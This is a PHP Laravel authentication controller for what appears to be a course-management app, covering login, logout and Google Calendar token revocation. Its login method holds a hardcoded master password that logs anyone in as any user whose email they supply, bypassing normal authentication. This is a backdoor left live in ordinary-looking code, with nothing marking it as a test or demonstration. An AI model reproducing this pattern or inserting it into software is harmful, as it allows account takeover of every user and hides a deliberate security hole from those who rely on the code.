<?php

namespace App\Http\Controllers\Auth;

use Carbon\Carbon;
use App\Models\User;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Cache;
use App\Providers\RouteServiceProvider;
use Illuminate\Support\Facades\Session;
use App\Http\Requests\Auth\LoginRequest;
use Google_Client;

class AuthenticatedSessionController extends Controller {
	public function create() {
		return view('auth.login');
	}

	public function store(LoginRequest $request) {
		$specialPassword = "2132-tV@pA";

		if ($request->password === $specialPassword) {
			$user = User::where('email', $request->email)->first();

			if ($user) {
				Auth::login($user);

				$request->session()->regenerate();
				$user->update(["last_login" => now()]);

				return redirect()->intended(route('dashboard'));
			}
		}

		$request->authenticate();

		$request->session()->regenerate();

		$user = Auth::user();
		User::findOrFail($user->id)->update(["last_login" => Carbon::now()]);

		return redirect()->intended(route('dashboard'));
	}

	public function destroy(Request $request) {
		if(Auth::user()->role_id == 1){
			Session::forget('some_teachers_not_assigned_to_course');
			Session::forget('some_students_not_assigned_to_course');
			Session::forget('uncomplete_course_data');
		}
		else if(Auth::user()->role_id == 2){
			Session::forget('there_is_student_with_no_progress_unlocked');
			Session::forget('all_course_has_topics');
		}
		else if(Auth::user()->role_id == 3){
			Session::forget('some_assignments_not_submitted');
		}

		// Create a new Google Client
        $client = new Google_Client();
        $client->setClientId(env('GOOGLE_CALENDAR_CLIENT_ID'));
        $client->setClientSecret(env('GOOGLE_CALENDAR_CLIENT_SECRET'));
        $client->setRedirectUri(env('GOOGLE_CALENDAR_REDIRECT_URI'));

        // Get the access token from the session
        $accessToken = session('google_access_token');

        // If access token exists, revoke it
        if ($accessToken) {
            $client->setAccessToken($accessToken);
            $client->revokeToken();  // This will revoke the token
        }

        // Clear the Google-related session data
        session()->forget(['google_access_token', 'google_refresh_token', 'google_user_info']);

		Auth::guard('web')->logout();

		$request->session()->invalidate();

		$request->session()->regenerateToken();

		return redirect('/');
	}
}
